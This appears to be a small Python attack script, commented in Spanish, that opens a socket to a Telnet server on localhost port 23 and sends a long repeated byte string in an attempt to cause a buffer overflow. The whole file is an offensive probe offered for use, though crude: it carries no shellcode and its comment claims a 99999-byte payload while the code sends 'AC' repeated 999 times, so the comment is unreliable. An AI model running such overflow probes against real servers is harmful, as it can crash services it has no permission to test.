import socket

def exploit_vulnerability():
    try:
        # Conectarse al servidor Telnet
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 23))

        # Envío de datos que podrían causar un desbordamiento de búfer
        payload = b'AC' * 999  # Enviar una cadena de bytes de longitud 99999
        s.send(payload)

        # Leer la respuesta del servidor (si la hay)
        response = s.recv(1024)
        print(response.decode('utf-8'))

        # Cerrar la conexión
        s.close()
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    exploit_vulnerability()
